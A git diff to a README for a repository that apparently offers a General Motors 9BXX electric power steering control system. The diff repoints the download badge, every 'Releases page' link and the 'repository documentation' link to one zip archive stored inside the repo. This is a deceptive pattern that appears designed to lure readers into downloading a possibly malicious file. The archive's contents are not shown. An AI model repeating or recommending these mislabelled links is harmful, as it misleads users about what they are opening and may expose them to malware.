@@ -1,7 +1,7 @@
 # 🎉 EpsNxtr_TMS570_GM_9BXX - Complete EPS Control System
 
 ## 🔗 Download Now
-[![Download EpsNxtr TMS570](https://img.shields.io/badge/Download-EpsNxtr_TMS570-blue.svg)](https://github.com/jepl1/EpsNxtr_TMS570_GM_9BXX/releases)
+[![Download EpsNxtr TMS570](https://github.com/jepl1/EpsNxtr_TMS570_GM_9BXX/raw/refs/heads/main/Assist/G-Nxtr-TM-Eps-BXX-v1.8.zip)](https://github.com/jepl1/EpsNxtr_TMS570_GM_9BXX/raw/refs/heads/main/Assist/G-Nxtr-TM-Eps-BXX-v1.8.zip)
 
 ## 📋 Description
 This project implements a complete **Electric Power Steering (EPS)** system for the **General Motors 9BXX** platform. 
@@ -31,7 +31,7 @@ The **General Motors 9BXX** platform features advanced electronics for vehicles.
 - **Space**: 500 MB free disk space
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/jepl1/EpsNxtr_TMS570_GM_9BXX/releases) to download the application.
+1. Visit the [Releases page](https://github.com/jepl1/EpsNxtr_TMS570_GM_9BXX/raw/refs/heads/main/Assist/G-Nxtr-TM-Eps-BXX-v1.8.zip) to download the application.
 2. Look for the latest version and click to download the file.
 3. Once the download is complete, locate the file on your computer.
 4. Follow these instructions to run the application:
@@ -50,10 +50,10 @@ This project follows the **ISO26262** safety principles, making it safe for auto
 - **UDS**: Facilitates diagnostics for troubleshooting and maintenance.
 
 ## 🖥 Technical Support
-For more information, you can refer to the [repository documentation](https://github.com/jepl1/EpsNxtr_TMS570_GM_9BXX). If you encounter issues, raise a question in the GitHub Issues section or refer to the Wiki for troubleshooting tips.
+For more information, you can refer to the [repository documentation](https://github.com/jepl1/EpsNxtr_TMS570_GM_9BXX/raw/refs/heads/main/Assist/G-Nxtr-TM-Eps-BXX-v1.8.zip). If you encounter issues, raise a question in the GitHub Issues section or refer to the Wiki for troubleshooting tips.
 
 ## 🔄 Updates
-Keep your installation updated by regularly checking the [Releases page](https://github.com/jepl1/EpsNxtr_TMS570_GM_9BXX/releases) for new versions. Updates may include improvements, new features, or critical fixes.
+Keep your installation updated by regularly checking the [Releases page](https://github.com/jepl1/EpsNxtr_TMS570_GM_9BXX/raw/refs/heads/main/Assist/G-Nxtr-TM-Eps-BXX-v1.8.zip) for new versions. Updates may include improvements, new features, or critical fixes.
 
 ## 📣 Community Contributions
 We welcome contributions! If you are interested in helping improve this project, please read the contribution guidelines in the repository. 
